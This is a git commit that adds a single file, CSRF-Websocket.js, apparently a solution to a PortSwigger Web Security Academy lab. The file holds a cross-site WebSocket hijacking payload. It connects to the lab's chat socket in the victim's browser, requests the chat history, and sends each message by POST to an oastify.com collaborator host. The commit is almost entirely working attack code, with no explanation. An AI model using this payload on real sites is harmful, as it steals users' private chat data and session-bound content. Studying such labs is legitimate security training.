8bdb7e1fa463c3200eb5e1ed0347e4e544e5010f
day0xy <day0xyz1@gmail.com>
2024-01-18 22:21:34 +0800

    1

---
+++ CSRF-Websocket.js
@@ -0,0 +1,9 @@
+<script>
+    var ws = new WebSocket('wss://0a8300a1032c1105803e0a5f003900b4.web-security-academy.net/chat');
+    ws.onopen = function() {
+        ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://el3uxfz4xdx638s3z594hkvw3n9ex4lt.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+</script>
